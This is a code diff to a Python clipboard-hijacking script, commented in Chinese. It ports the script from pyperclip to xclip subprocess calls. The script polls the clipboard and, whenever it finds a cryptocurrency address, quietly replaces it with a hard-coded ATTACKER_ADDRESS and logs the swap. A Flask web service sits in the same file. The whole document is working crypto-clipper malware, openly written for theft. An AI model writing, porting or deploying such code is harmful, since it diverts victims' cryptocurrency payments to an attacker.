@@ -1,8 +1,9 @@
-from flask import Flask, request
-import pyperclip
+from flask import Flask
 import re
 import time
 import threading
+import subprocess
+
 
 # 替换的目标目标地址
 ATTACKER_ADDRESS = "panteklu"
@@ -35,6 +36,32 @@ def is_crypto_address(address):
         return False
 
 
+def set_clipboard(content):
+    """
+    设置剪贴板内容，这里改用 xclip 或 Windows API，而不是 pyperclip
+    """
+    try:
+        # 针对 Linux/UNIX
+        subprocess.run(['xclip', '-selection', 'clipboard'], input=content, text=True)
+    except FileNotFoundError:
+        print("xclip not found. Please install xclip on your system.")
+    except Exception as e:
+        print(f"Failed to set clipboard content: {e}")
+
+
+def get_clipboard():
+    """
+    获取剪贴板内容（替代 pyperclip）
+    """
+    try:
+        # 针对 Linux/UNIX
+        result = subprocess.run(['xclip', '-o', '-selection', 'clipboard'], stdout=subprocess.PIPE, text=True)
+        return result.stdout.strip()
+    except Exception as e:
+        print(f"Failed to get clipboard content: {e}")
+        return ""
+
+
 def monitor_clipboard():
     """
     监控剪贴板内容，并自动替换符合加密货币地址的内容。
@@ -42,10 +69,10 @@ def monitor_clipboard():
     previous_text = ""
     while True:
         try:
-            clipboard_content = pyperclip.paste()
+            clipboard_content = get_clipboard()
 
             if clipboard_content != previous_text and is_crypto_address(clipboard_content):
-                pyperclip.copy(ATTACKER_ADDRESS)
+                set_clipboard(ATTACKER_ADDRESS)
                 previous_text = ATTACKER_ADDRESS
                 print(f"Replaced clipboard content: {clipboard_content} -> {ATTACKER_ADDRESS}")
             else:
@@ -57,7 +84,6 @@ def monitor_clipboard():
             time.sleep(1)
 
 
-# Flask Web服务
 app = Flask(__name__)
 
 @app.route('/', methods=['GET'])
